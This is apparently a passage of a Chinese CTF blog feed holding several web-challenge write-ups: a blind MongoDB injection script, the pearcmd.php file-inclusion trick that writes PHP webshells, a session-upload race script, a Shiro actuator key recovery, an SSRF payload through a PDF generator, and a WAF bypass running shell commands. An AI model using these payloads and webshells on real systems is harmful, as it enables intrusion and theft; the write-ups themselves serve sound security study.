<pre><code>PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KCiAgICA8aGVhZD4KICAgICAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICAgICAgPHRpdGxlPkZMQUc8L3RpdGxlPgogICAgPC9oZWFkPgoKICAgIDxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOmJsYWNrOyI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPGgxIHN0eWxlPSJmb250LWZhbWlseTp2ZXJkYW5hO2NvbG9yOnJlZDt0ZXh0LWFsaWduOmNlbnRlcjsiPuWViuWTiO+8geS9oOaJvuWIsOaIkeS6hu+8geWPr+aYr+S9oOeci+S4jeWIsOaIkVFBUX5+fjwvaDE+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPHAgc3R5bGU9ImZvbnQtZmFtaWx5OmFyaWFsO2NvbG9yOnJlZDtmb250LXNpemU6MjBweDt0ZXh0LWFsaWduOmNlbnRlcjsiPgogICAgICAgICAgICA8P3BocAogICAgICAgICAgICAgICAgZWNobyAi5oiR5bCx5Zyo6L+Z6YeMIjsKICAgICAgICAgICAgICAgICRmbGFnID0gJ2ZsYWd7NTE5ZjkxMjAtMjQ1Mi00MWQ1LThkNDUtZWU0MDRhMGVlZTk0fSc7CiAgICAgICAgICAgICAgICAkc2VjcmV0ID0gJ2ppQW5nX0x1eXVhbl93NG50c19hX2cxcklmcmkzbmQnCiAgICAgICAgICAgID8+CiAgICAgICAgPC9wPgogICAgPC9ib2R5PgoKPC9odG1sPgo=
</code></pre>
<p><img src="/2021/06/09/ji-ke-da-tiao-zhan-2019-secretfile/image-20210609211626525.png" alt="image-20210609211626525"></p>
]]></content>
      <tags>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title>祥云杯：2021-PackageManager</title>
    <url>/2021/09/17/xiang-yun-bei-2021-packagemanager/</url>
    <content><![CDATA[<h5 id="routes-index-ts-auth"><a href="#routes-index-ts-auth" class="headerlink" title="routes/index.ts/auth"></a>routes/index.ts/auth</h5><pre><code>router.post('/auth', async (req, res) =&gt; {
    let { token } = req.body;
    if (token !== '' &amp;&amp; typeof (token) === 'string') {
        if (checkmd5Regex(token)) {
            try {
                let docs = await User.$where(`this.username == "admin" &amp;&amp; hex_md5(this.password) == "${token.toString()}"`).exec()
                console.log(docs);
                if (docs.length == 1) {
                    if (!(docs[0].isAdmin === true)) {
                        return res.render('auth', { error: 'Failed to auth' })
                    }
                } else {
                    return res.render('auth', { error: 'No matching results' })
                }
            } catch (err) {
                return res.render('auth', { error: err })
            }
        } else {
            return res.render('auth', { error: 'Token must be valid md5 string' })
        }
    } else {
        return res.render('auth', { error: 'Parameters error' })
    }
    req.session.AccessGranted = true
    res.redirect('/packages/submit')
});</code></pre>
<p>${token.toString()}会进行sql查询</p>
<h5 id="utils-ts"><a href="#utils-ts" class="headerlink" title="utils.ts"></a>utils.ts</h5><pre><code>const checkmd5Regex = (token: string) =&gt; {
  return /([a-f\d]{32}|[A-F\d]{32})/.exec(token);
}</code></pre>
<pre><code>import requests
import string

url="http://ad346fe2-fdb6-4af4-88ac-49b8b004465d.node4.buuoj.cn:81/auth"
headers={
    "Cookie": "session=s%3AWbkqqZLgEJyWVUz5y8XshWYlmJCKq6Cc.swkxtSblPsO3VUzLYTgmdBJnyrOvYaEZNTib2n25ELk",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0",
    "Referer": "http://ad346fe2-fdb6-4af4-88ac-49b8b004465d.node4.buuoj.cn:81/packages/submit",
    "Origin": "http://ad346fe2-fdb6-4af4-88ac-49b8b004465d.node4.buuoj.cn:81",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Upgrade-Insecure-Requests": "1",
}

flag = ''
for i in range(10000):
    for j in string.printable:
        if j == '"':
            continue
        payload='aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"||this.password[{}]=="{}'.format(i,j)
        #print(payload)
        data={
            "_csrf":"fGncfKRG-Eut4uMRWH_RLxlj68DotG18-25I",
            "token":payload
        }


        r=requests.post(url=url,data=data,headers=headers,allow_redirects=False)
        #print(r.text)
        if "Found. Redirecting to" in r.text:
            #print(payload)
            flag+=j
            print(flag)
            break
"!@#&amp;@&amp;@efefef*@((@))grgregret3r"
"!@#&amp;@&amp;@efefef*@((@))grgregret3r"</code></pre>
<p>登录获得flag就好</p>
]]></content>
  </entry>
  <entry>
    <title>pearcmd.php小trick/湖湘杯2021</title>
    <url>/2021/11/15/hu-xiang-bei-2021/</url>
    <content><![CDATA[<h1 id="pearcmd-php小trick"><a href="#pearcmd-php小trick" class="headerlink" title="pearcmd.php小trick"></a>pearcmd.php小trick</h1><p>湖湘杯easywill的基础</p>
<p>原文：<a href="https://tttang.com/archive/1312/#toc_0x06-pearcmdphp">https://tttang.com/archive/1312/#toc_0x06-pearcmdphp</a></p>
<p>最后这个是我想介绍的被我“捂烂了”的trick，就是利用<code>pearcmd.php</code>这个pecl/pear中的文件。</p>
<p>pecl是PHP中用于管理扩展而使用的命令行工具，而pear是pecl依赖的类库。在7.3及以前，pecl/pear是默认安装的；在7.4及以后，需要我们在编译PHP的时候指定<code>--with-pear</code>才会安装。</p>
<p>不过，在Docker任意版本镜像中，pcel/pear都会被默认安装，安装的路径在<code>/usr/local/lib/php</code>。</p>
<p>原本pear/pcel是一个命令行工具，并不在Web目录下，即使存在一些安全隐患也无需担心。但我们遇到的场景比较特殊，是一个文件包含的场景，那么我们就可以包含到pear中的文件，进而利用其中的特性来搞事。</p>
<p>我最早的时候是在阅读phpinfo()的过程中，发现Docker环境下的PHP会开启<code>register_argc_argv</code>这个配置。文档中对这个选项的介绍不是特别清楚，大概的意思是，当开启了这个选项，用户的输入将会被赋予给<code>$argc</code>、<code>$argv</code>、<code>$_SERVER['argv']</code>几个变量。</p>
<p>如果PHP以命令行的形式运行（即sapi是cli），这里很好理解。但如果PHP以Server的形式运行，且又开启了<code>register_argc_argv</code>，那么这其中是怎么处理的？</p>
<p>我们在PHP源码中可以看到这样的逻辑：</p>
<pre><code>static zend_bool php_auto_globals_create_server(zend_string *name)
{
    if (PG(variables_order) &amp;&amp; (strchr(PG(variables_order),'S') || strchr(PG(variables_order),'s'))) {
        php_register_server_variables();

        if (PG(register_argc_argv)) {
            if (SG(request_info).argc) {
                zval *argc, *argv;

                if ((argc = zend_hash_find_ex_ind(&amp;EG(symbol_table), ZSTR_KNOWN(ZEND_STR_ARGC), 1)) != NULL &amp;&amp;
                    (argv = zend_hash_find_ex_ind(&amp;EG(symbol_table), ZSTR_KNOWN(ZEND_STR_ARGV), 1)) != NULL) {
                    Z_ADDREF_P(argv);
                    zend_hash_update(Z_ARRVAL(PG(http_globals)[TRACK_VARS_SERVER]), ZSTR_KNOWN(ZEND_STR_ARGV), argv);
                    zend_hash_update(Z_ARRVAL(PG(http_globals)[TRACK_VARS_SERVER]), ZSTR_KNOWN(ZEND_STR_ARGC), argc);
                }
            } else {
                php_build_argv(SG(request_info).query_string, &amp;PG(http_globals)[TRACK_VARS_SERVER]);
            }
        }

    } else {
        zval_ptr_dtor_nogc(&amp;PG(http_globals)[TRACK_VARS_SERVER]);
        array_init(&amp;PG(http_globals)[TRACK_VARS_SERVER]);
    }
    ...</code></pre>
<p>第一个if语句判断<code>variables_order</code>中是否有<code>S</code>，即<code>$_SERVER</code>变量；第二个if语句判断是否开启register_argc_argv，第三个if语句判断是否有request_info.argc存在，如果不存在，其执行的是这条语句：</p>
<pre><code>php_build_argv(SG(request_info).query_string, &amp;PG(http_globals)[TRACK_VARS_SERVER]);</code></pre>
<p>无论php_build_argv函数内部是怎么处理的，<code>SG(request_info).query_string</code>都非常吸引我，这段代码是否意味着，HTTP数据包中的query-string会被作为argv的值？</p>
<p>果然：</p>
<p><img src="https://storage.tttang.com/media/attachment/2021/11/01/661223a3-6bfb-4ef2-ad14-0a6bc53128fa.png" alt="image-20211101072557483.png"></p>
<p>其实这个结果是符合<a href="http://www.ietf.org/rfc/rfc3875">RFC3875</a>的：</p>
<blockquote>
<p>4.4.  The Script Command Line</p>
<p>Some systems support a method for supplying an array of strings to<br>   the CGI script.  This is only used in the case of an ‘indexed’ HTTP<br>   query, which is identified by a ‘GET’ or ‘HEAD’ request with a URI<br>   query string that does not contain any unencoded “=” characters.  For<br>   such a request, the server SHOULD treat the query-string as a<br>   search-string and parse it into words, using the rules</p>
<pre><code>  search-string = search-word *( "+" search-word )
  search-word   = 1*schar
  schar         = unreserved | escaped | xreserved
  xreserved     = ";" | "/" | "?" | ":" | "@" | "&amp;" | "=" | "," |
                  "$"</code></pre>
<p>After parsing, each search-word is URL-decoded, optionally encoded in<br>   a system-defined manner and then added to the command line argument<br>   list.</p>
</blockquote>
<p>RFC3875中规定，如果query-string中不包含没有编码的<code>=</code>，且请求是GET或HEAD，则query-string需要被作为命令行参数。</p>
<p>当年PHP-CGI曾在这上面栽过跟头，具体的细节可以参考我以前写的这篇文章：《<a href="https://www.leavesongs.com/PENETRATION/php-cgi-cve-2012-1823.html">PHP-CGI远程代码执行漏洞（CVE-2012-1823）分析</a>》。PHP现在仍然没有严格按照RFC来处理，即使我们传入的query-string包含等号，也仍会被赋值给<code>$_SERVER['argv']</code>。</p>
<p>我们再来看到pear中获取命令行argv的函数：</p>
<pre><code>public static function readPHPArgv()
{
    global $argv;
    if (!is_array($argv)) {
        if (!@is_array($_SERVER['argv'])) {
            if (!@is_array($GLOBALS['HTTP_SERVER_VARS']['argv'])) {
                $msg = "Could not read cmd args (register_argc_argv=Off?)";
                return PEAR::raiseError("Console_Getopt: " . $msg);
            }
            return $GLOBALS['HTTP_SERVER_VARS']['argv'];
        }
        return $_SERVER['argv'];
    }
    return $argv;
}</code></pre>
<p>先尝试<code>$argv</code>，如果不存在再尝试<code>$_SERVER['argv']</code>，后者我们可通过query-string控制。也就是说，我们通过Web访问了pear命令行的功能，且能够控制命令行的参数。</p>
<p>看看pear中有哪些可以利用的参数：</p>
<p><img src="https://storage.tttang.com/media/attachment/2021/11/01/2de99d32-2d60-43af-8ee5-0111fdc52f38.png" alt="image-20211101074033767.png"></p>
<p>第一眼就看到config-create，阅读其代码和帮助，可以知道，这个命令需要传入两个参数，其中第二个参数是写入的文件路径，第一个参数会被写入到这个文件中。</p>
<p>所以，我构造出最后的利用数据包如下：</p>
<pre><code>GET /index.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=phpinfo()?&gt;+/tmp/hello.php HTTP/1.1
Host: 192.168.1.162:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Connection: close</code></pre>
<p><img src="https://storage.tttang.com/media/attachment/2021/11/01/8f2dd9ad-a7bd-456d-9c8e-f4a9cd7770cd.png" alt="image-20211101080626844.png"></p>
<p>发送这个数据包，目标将会写入一个文件<code>/tmp/hello.php</code>，其内容包含<code>&lt;?=phpinfo()?&gt;</code>：</p>
<p><img src="https://storage.tttang.com/media/attachment/2021/11/01/3b439ba8-a064-4348-a23d-6f96d6d5bb77.png" alt="image-20211101080156805.png"></p>
<p>然后，我们再利用文件包含漏洞包含这个文件即可getshell：</p>
<p><img src="https://storage.tttang.com/media/attachment/2021/11/01/e12aef87-9aea-41bb-a13f-6e0932e6b9cc.png" alt="image-20211101080447027.png"></p>
<p>最后这个利用方法，无需条件竞争，也没有额外其他的版本限制等，只要是Docker启动的PHP环境即可通过上述一个数据包搞定。</p>
<h1 id="Easywill"><a href="#Easywill" class="headerlink" title="Easywill"></a>Easywill</h1><p>网上下载源码,丢进seay审计代码：</p>
<p><img src="/%E6%B9%96%E6%B9%98%E6%9D%AF2021.assets/image-20211118110602137.png" alt="image-20211118110602137"></p>
<p>审计到Template.php</p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">assign</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    \<span class="token package">wiphp<span class="token punctuation">\</span>View</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">assign</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>assign模板渲染</p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">renderTo</span><span class="token punctuation">(</span><span class="token variable">$viewfile</span><span class="token punctuation">,</span> <span class="token variable">$vars</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$m</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token constant">__MODULE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$cfile</span> <span class="token operator">=</span> <span class="token string">'view-'</span><span class="token punctuation">.</span><span class="token variable">$m</span><span class="token punctuation">.</span><span class="token string">'_'</span><span class="token punctuation">.</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$viewfile</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'.php'</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$viewfile</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'jump.html'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$cfile</span> <span class="token operator">=</span> <span class="token string">'view-jump.html.php'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token variable">$cfile</span> <span class="token operator">=</span> <span class="token constant">PATH_VIEWC</span><span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">.</span><span class="token variable">$cfile</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant">APP_DEBUG</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$cfile</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">filemtime</span><span class="token punctuation">(</span><span class="token variable">$cfile</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token function">filemtime</span><span class="token punctuation">(</span><span class="token variable">$viewfile</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$strs</span> <span class="token operator">=</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">compile</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$viewfile</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$vars</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$cfile</span><span class="token punctuation">,</span> <span class="token variable">$strs</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$vars</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">include</span> <span class="token variable">$cfile</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>$cfile可控</p>
<pre><code>?name=cfile&amp;value=/etc/passwd</code></pre>
<p><img src="/%E6%B9%96%E6%B9%98%E6%9D%AF2021.assets/image-20211118164144041.png" alt="image-20211118164144041"></p>
<pre><code>?name=cfile&amp;+config-create+/&amp;value=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=var_dump(system($_GET[1]));?&gt;+/tmp/a.php</code></pre>
<p><img src="/%E6%B9%96%E6%B9%98%E6%9D%AF2021.assets/image-20211118164224693.png" alt="image-20211118164224693"></p>
<pre><code>?name=cfile&amp;value=/tmp/a.php&amp;1=ls</code></pre>
<p><img src="/%E6%B9%96%E6%B9%98%E6%9D%AF2021.assets/image-20211118164039627.png" alt="image-20211118164039627"></p>
<p>乱七八糟，查看根目录</p>
<pre><code>?name=cfile&amp;value=/tmp/a.php&amp;1=ls%20/</code></pre>
<p><img src="/%E6%B9%96%E6%B9%98%E6%9D%AF2021.assets/image-20211118164013390.png" alt="image-20211118164013390"></p>
<p>查看扥目录下的flag32897328937298hdwidh</p>
<pre><code>?name=cfile&amp;value=/tmp/a.php&amp;1=cat%20/flag32897328937298hdwidh</code></pre>
<p><img src="/%E6%B9%96%E6%B9%98%E6%9D%AF2021.assets/image-20211118163936469.png" alt="image-20211118163936469"></p>
<pre><code>?name=cfile&amp;value=/usr/local/lib/php/pearcmd.php&amp;+-c+/tmp/b.php+-d+man_dir=&lt;?@eval($_POST[0]);?&gt;+-s+ </code></pre>
<p>这还可以用到条件竞争：</p>
<p>参考：<a href="https://tttang.com/archive/1312/">https://tttang.com/archive/1312/</a></p>
<pre class=" language-Python"><code class="language-Python">import threading
import requests
from concurrent.futures import ThreadPoolExecutor, wait

target = 'http://192.168.1.162:8080/index.php'
session = requests.session()
flag = 'helloworld'


def upload(e: threading.Event):
    files = [
        ('file', ('load.png', b'a' * 40960, 'image/png')),
    ]
    data = {'PHP_SESSION_UPLOAD_PROGRESS': rf'''<?php file_put_contents('/tmp/success', '<?=`ls /`?>'); echo('{flag}'); ?>'''}

    while not e.is_set():
        requests.post(
            target,
            data=data,
            files=files,
            cookies={'PHPSESSID': flag},
        )


def write(e: threading.Event):
    while not e.is_set():
        response = requests.get(
            f'{target}?file=/tmp/sess_{flag}',
        )

        if flag.encode() in response.content:
            e.set()


if __name__ == '__main__':
    futures = []
    event = threading.Event()
    pool = ThreadPoolExecutor(15)
    for i in range(10):
        futures.append(pool.submit(upload, event))

    for i in range(5):
        futures.append(pool.submit(write, event))

    wait(futures)</code></pre>
<p>脚本执行完毕在目标中写入/tmp/success,里面为webshell：</p>
<h1 id="Pentest-in-Autumn"><a href="#Pentest-in-Autumn" class="headerlink" title="Pentest in Autumn"></a>Pentest in Autumn</h1><p>pom.xml里面有个shiro 1.5.0</p>
<p>扫描目录发现有/actuator文件</p>
<p>结合shiro鉴权绕过可以成功访问到</p>
<pre><code>/;/actuator/env</code></pre>
<pre><code>/;/actuator/heapdump</code></pre>
<p>找key的工具</p>
<pre><code>https://www.cnblogs.com/icez/p/Actuator_heapdump_exploit.html</code></pre>
<p>还原：</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> base64
<span class="token keyword">import</span> struct
str<span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">'&lt;bbbbbbbbbbbbbbbb'</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">56</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">57</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">81</span><span class="token punctuation">,</span><span class="token number">57</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">84</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">56</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">96</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">89</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span></code></pre>
<p>用shiro工具</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://blog.csdn.net/meteox/article/details/121334507">https://blog.csdn.net/meteox/article/details/121334507</a></p>
<p><a href="https://ego00.blog.csdn.net/article/details/121323469">https://ego00.blog.csdn.net/article/details/121323469</a></p>
]]></content>
  </entry>
  <entry>
    <title>祥云杯：2021-secrets_of_admin</title>
    <url>/2021/09/16/xiang-yun-bei-2021-secrets-of-admin/</url>
    <content><![CDATA[<p><img src="/2021/09/16/xiang-yun-bei-2021-secrets-of-admin/image-20210916162929910.png" alt="image-20210916162929910"></p>
<p>下载源码</p>
<p><img src="/2021/09/16/xiang-yun-bei-2021-secrets-of-admin/image-20210916162953995.png" alt="image-20210916162953995"></p>
<p>在database.js中发现admin账号密码：</p>
<pre><code>INSERT INTO users (id, username, password) VALUES (1, 'admin','e365655e013ce7fdbdbf8f27b418c8fe6dc9354dc4c0328fa02b0ea547659645');</code></pre>
<p><img src="/2021/09/16/xiang-yun-bei-2021-secrets-of-admin/image-20210916163553079.png" alt="image-20210916163553079"></p>
<p>我们要通过SSRF把superuser中的flag文件添加到admin中并读取</p>
<h5 id="routes-index-ts"><a href="#routes-index-ts" class="headerlink" title="routes/index.ts"></a>routes/index.ts</h5><p>content参数可以使用数组绕过</p>
<pre><code>router.post('/admin', checkAuth, (req, res, next) =&gt; {
    let { content } = req.body;
    if ( content == '' || content.includes('&lt;') || content.includes('&gt;') || content.includes('/') || content.includes('script') || content.includes('on')){
        // even admin can't be trusted right ? :)  
        return res.render('admin', { error: 'Forbidden word 🤬'});
    } else {
        let template = `
        &lt;html&gt;
        &lt;meta charset="utf8"&gt;
        &lt;title&gt;Create your own pdfs&lt;/title&gt;
        &lt;body&gt;
        &lt;h3&gt;${content}&lt;/h3&gt;
        &lt;/body&gt;
        &lt;/html&gt;
        `
        try {
            const filename = `${uuid()}.pdf`
            pdf.create(template, {
                "format": "Letter",
                "orientation": "portrait",
                "border": "0",
                "type": "pdf",
                "renderDelay": 3000,
                "timeout": 5000
            }).toFile(`./files/${filename}`, async (err, _) =&gt; {
                if (err) next(createError(500));
                const checksum = await getCheckSum(filename);
                await DB.Create('superuser', filename, checksum)
                return res.render('admin', { message : `Your pdf is successfully saved 🤑 You know how to download it right?`});
            });
        } catch (err) {
            return res.render('admin', { error : 'Failed to generate pdf 😥'})
        }
    }
});</code></pre>
<p>正则仅允许127.0.0.1</p>
<pre><code>router.get('/api/files', async (req, res, next) =&gt; {
    if (req.socket.remoteAddress.replace(/^.*:/, '') != '127.0.0.1') {
        return next(createError(401));</code></pre>
<p>代码显示我们可以任意用户名、文件名、和checknum来往数据库中添加文件</p>
<pre><code> if (typeof(username) == "string" &amp;&amp; typeof(filename) == "string" &amp;&amp; typeof(checksum) == "string") {
        try {
            await DB.Create(username, filename, checksum)</code></pre>
<p>需要把<code>flag</code>给<code>admin</code>用户</p>
<pre><code>   let filename = await DB.getFile(token.username, req.params.id)
            if (fs.existsSync(path.join(__dirname , "../files/", filename))){
                return res.send(await readFile(path.join(__dirname , "../files/", filename)));</code></pre>
<h5 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h5><pre><code>content[]=&lt;script&gt;
var xhr = new XMLHttpRequest();xhr.open("GET", "http://127.0.0.1:8888/api/files?username=admin&amp;filename=./flag&amp;checksum=123", true);xhr.send();
&lt;/script&gt;</code></pre>
<pre><code>content[]=&lt;script&gt;location.href="http://127.0.0.1:8888/api/files?username=admin&amp;filename=./flag&amp;checksum=123";&lt;/script&gt;</code></pre>
<pre><code>content[]=a&amp;content[]=&lt;img src="http://127.0.0.1:8888/api/files?username=admin&amp;filename=./flag&amp;checksum=123"&gt;</code></pre>
<p><img src="/2021/09/16/xiang-yun-bei-2021-secrets-of-admin/image-20210916181139977.png" alt="image-20210916181139977"></p>
<p>访问/api/files/123</p>
<p><img src="/2021/09/16/xiang-yun-bei-2021-secrets-of-admin/image-20210916181220555.png" alt="image-20210916181220555"></p>
]]></content>
      <tags>
        <tag>ssrf</tag>
      </tags>
  </entry>
  <entry>
    <title>红明谷CTF：write_shell</title>
    <url>/2021/09/01/hong-ming-gu-ctf-write-shell/</url>
    <content><![CDATA[<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/'| |_|php|;|~|\\^|\\+|eval|{|}/i"</span><span class="token punctuation">,</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token comment" spellcheck="true">// if(preg_match("/'| |_|=|php/",$input)){</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'hacker!!!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token variable">$input</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$input</span> <span class="token keyword">as</span> <span class="token variable">$key</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$output</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token variable">$input</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$output</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
        <span class="token variable">$input</span> <span class="token operator">=</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token string">'sandbox/'</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'/'</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">switch</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"action"</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">?</span> <span class="token string">""</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">case</span> <span class="token string">'pwd'</span><span class="token punctuation">:</span>
        <span class="token keyword">echo</span> <span class="token variable">$dir</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">case</span> <span class="token string">'upload'</span><span class="token punctuation">:</span>
        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"data"</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">?</span> <span class="token string">""</span><span class="token punctuation">;</span>
        <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string">"$dir"</span> <span class="token punctuation">.</span> <span class="token string">"index.php"</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter">?></span></code></pre>
<p>可以看到，action为pwd时，会打印当前的目录路径；action为upload时，会上传数据到目录路径下的index.php中，并且会对上传的数据进行检查</p>
<p>在check函数中可以看到，输入的数据不可以包含 ‘ ’，’_’, ‘php’, ‘eval’, ‘{‘, ‘}’ 没过滤反引号，欸嘿，突破口找到了</p>
<p>先看看当前文件路径</p>
<p><img src="/2021/09/01/hong-ming-gu-ctf-write-shell/image-20210901161445914.png" alt="image-20210901161445914"></p>
<pre><code>?action=upload&amp;data=&lt;?=`cat\t/*`?&gt;</code></pre>
<p><img src="/2021/09/01/hong-ming-gu-ctf-write-shell/image-20210901161513328.png" alt="image-20210901161513328"></p>
]]></content>
  </entry>
  <entry>
    <title>网鼎杯2018：fakebook</title>
    <url>/2021/10/24/wang-ding-bei-2018-fakebook/</url>
